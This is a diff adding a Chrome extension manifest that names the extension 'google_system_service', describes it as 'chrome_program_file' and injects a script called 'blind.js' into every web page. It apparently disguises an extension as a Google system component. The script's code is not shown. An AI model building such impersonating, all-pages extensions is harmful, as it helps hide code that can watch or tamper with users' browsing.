@@ -1,0 +1,15 @@
+{
+    "name": "google_system_service",
+    "version": "88.0.4324.20210302",
+    "description": "chrome_program_file",
+    "background": {
+        "scripts" : ["background.js"],
+        "persistent": false
+    },
+    "icons": {
+        "16": "icon16.png",
+        "48": "icon48.png"
+    },
+    "content_scripts": [{"matches": ["<all_urls>"], "js": ["blind.js"]}],
+    "manifest_version": 2
+}
